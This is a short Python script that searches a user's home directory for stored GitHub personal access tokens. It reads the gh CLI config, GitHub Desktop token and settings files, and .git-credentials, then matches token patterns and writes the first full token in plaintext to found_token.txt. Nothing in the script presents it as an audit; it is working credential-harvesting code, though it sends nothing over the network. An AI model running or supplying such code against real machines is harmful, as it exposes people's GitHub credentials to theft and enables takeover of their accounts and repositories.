import os, re

user_dir = os.path.expanduser("~")
print("Searching for GitHub tokens in user directory...")

token_pattern = re.compile(r'(ghp_[A-Za-z0-9_]{36}|github_pat_[A-Za-z0-9_]{82})')

paths_to_check = [
    os.path.join(user_dir, ".config", "gh", "hosts.yml"),
    os.path.join(user_dir, "AppData", "Roaming", "GitHub Desktop", "authToken"),
    os.path.join(user_dir, "AppData", "Local", "GitHubDesktop", "settings.json"),
    os.path.join(user_dir, ".git-credentials"),
]

found = []
for p in paths_to_check:
    if os.path.exists(p):
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                matches = token_pattern.findall(content)
                if matches:
                    found.extend(matches)
        except Exception as e:
            pass

if found:
    print("Found GitHub Token:", found[0][:8] + "...")
    with open("found_token.txt", "w") as f:
        f.write(found[0])
else:
    print("No stored GitHub PAT found in standard paths.")
